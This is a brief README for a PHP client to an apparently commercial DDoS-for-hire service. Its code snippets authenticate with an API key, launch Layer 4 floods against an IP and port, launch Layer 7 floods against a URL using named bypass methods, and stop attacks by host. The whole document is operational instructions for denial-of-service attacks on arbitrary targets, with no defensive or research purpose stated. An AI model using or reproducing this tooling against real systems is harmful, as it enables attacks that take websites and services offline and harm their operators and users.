# Undisclosed-API

## Requirements
PHP version 5.x (+).<br/>
Libcurl package.
## Authentication
```php
require 'API.php';
// Username and API Key generated from API Manager website.
$api = new API("username", "your-apikey");
```

## Layer 4 Attack
```php
/* Parameters : IPv4 , Port , Time , Method , Slots */
$response = $api->startL4("1.1.1.1", 80, 15, "TCPBYPASS", 1);
```
## Layer 7 Attack
```php
/* Parameters : URL , Time , Method , Slots , Type */
$response = $api->startL7("https://example.com/", 15, "HTTPSLAVIC", 1, "GET");
```
## Stop Attack
```php
/* Parameters : Host. */
$response = $api->stopAttack("1.1.1.1");
```

## API Response
```php
echo $response; // Get API response.
```
